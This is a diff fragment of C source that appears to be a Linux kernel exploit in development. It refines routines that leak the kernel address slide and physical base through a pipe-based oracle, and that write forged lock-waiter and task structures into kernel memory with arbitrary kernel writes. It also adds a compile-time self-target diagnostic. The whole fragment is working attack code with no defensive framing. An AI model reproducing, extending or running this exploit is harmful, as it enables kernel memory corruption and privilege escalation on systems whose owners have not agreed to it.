@@ -1354,6 +1354,10 @@ static int slide_leak_physical_base(void) {
   const int max_search_batches = fresh_page_attempts;
 #endif
   int refresh_oracle = 0;
+#if defined(APP_SLIDE_SELF_TARGET_DIAGNOSTIC) && \
+    APP_SLIDE_SELF_TARGET_DIAGNOSTIC
+  (void)refresh_oracle;
+#endif
   while (fresh_attempt <= fresh_page_attempts &&
          search_batch < max_search_batches) {
 #if defined(APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE) && \
@@ -1398,6 +1402,16 @@ static int slide_leak_physical_base(void) {
       refresh_oracle = 1;
       continue;
     }
+#if defined(APP_SLIDE_SELF_TARGET_DIAGNOSTIC) && \
+    APP_SLIDE_SELF_TARGET_DIAGNOSTIC
+    int self_target_mutated = read_slide_reclaim_self_target();
+    pr_info("p0 result-copy self-target mutation=%d target=%016zx "
+            "expected=%016zx\n",
+            self_target_mutated, slide_oracle_target,
+            slide_oracle_parent);
+    pr_info("p0 result-copy self-target diagnostic complete\n");
+    return 0;
+#endif
     int gate_result = verify_p0_pipe_oracle_gate();
     pr_info("p0 fresh page result=%d attempt=%d/%d\n",
             gate_result, fresh_attempt, fresh_page_attempts);
@@ -1654,9 +1668,10 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
   if (kernel_write_data(fd, marker_address, marker, sizeof(marker) - 1) !=
           (ssize_t)(sizeof(marker) - 1) ||
       !p0_diag_write32(fd, lock + 0x00, 0) ||
-      !p0_diag_write64(fd, lock + 0x08, waiter) ||
-      !p0_diag_write64(fd, lock + 0x10, waiter) ||
-      !p0_diag_write64(fd, lock + 0x18, SLIDE_LOCK_OWNER_VALUE) ||
+      !p0_diag_write64(fd, lock + FAKE_LOCK_WAITERS_ROOT_OFF, waiter) ||
+      !p0_diag_write64(fd, lock + FAKE_LOCK_WAITERS_LEFTMOST_OFF, waiter) ||
+      !p0_diag_write64(fd, lock + FAKE_LOCK_OWNER_OFF,
+                       SLIDE_LOCK_OWNER_VALUE) ||
       !prepare_p0_diag_waiter(fd, waiter, parent, target, task, lock) ||
       !p0_diag_write32(fd, task + FAKE_TASK_USAGE_OFF, 0x100) ||
       !p0_diag_write32(fd, task + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO) ||
